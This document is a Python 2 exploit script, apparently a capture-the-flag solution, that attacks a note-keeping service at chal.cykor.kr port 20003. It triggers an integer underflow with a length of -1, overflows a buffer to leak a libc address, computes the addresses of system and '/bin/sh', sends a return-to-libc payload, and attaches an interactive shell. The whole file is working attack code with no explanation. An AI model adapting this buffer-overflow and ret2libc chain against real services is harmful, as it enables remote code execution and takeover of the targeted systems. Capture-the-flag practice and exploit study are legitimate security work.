from socket import *
import struct
from telnetlib import *
p = lambda x:struct.pack("<L",x)
up = lambda x:struct.unpack("<L",x)


HOST = "chal.cykor.kr"
PORT = 20003

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST,PORT))

write_plt = 0x1160
write_got = 0x504c
libc_start_main = 0x5048
pppr = 0x29cd

payload = "A"*0x4cc
payload += p(write_plt)
payload += p(pppr)
payload += p(0)
payload += p(write_got)
payload += p(4)
def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data


def recvmain():
	print recvuntil("3) Exit")

def recvmenu():
	print recvuntil("8) Logout")

def register():
	s.send("2\n")
	print recvuntil("userid : ")
	s.send("s0ngsari\n")
	print recvuntil("userpw : ")
	s.send("s0ngsari\n")
	recvmain()

def writenote():
	s.send("2\n")
	print recvuntil("title : ")
	s.send(filename + "\n")
	print recvuntil("filedata length : ")
	s.send("-1\n") #underflow
	print recvuntil("password : ")
	s.send("\n")
	recvmenu()
filename = "leavecat123"
def editnote():
	
	

	s.send("4\n")
	print recvuntil("title : ")
	s.send(filename +"\n")
	print recvuntil("password : ")
	s.send("\n")
	print recvuntil("original data : ")
	leak = s.recv(0x4cc)
	libc_base = up(s.recv(4))[0] - 0x18637
	binsh = libc_base + 0x15909f
	system = libc_base + 0x3a920
	print "[*] LIBC base: " + hex(libc_base)
	print "[*] /bin/sh : " + hex(binsh)
	print "[*} system : " + hex(system)
	payload = "A"*0x48c
	payload += p(system)
	payload += "AAAA"
	payload += p(binsh)
	s.send(payload + "\n")
	s.send("cd /\n")
	s.send("ls\n")

def login():
	s.send("1\n")
	print recvuntil("userid : ")
	s.send("s0ngsari\n")
	print recvuntil("userpw : ")
	s.send("s0ngsari\n")
	recvmenu()


if __name__ == "__main__":
	register()
	login()
	writenote()
	editnote()


t = Telnet()
t.sock = s
t.interact()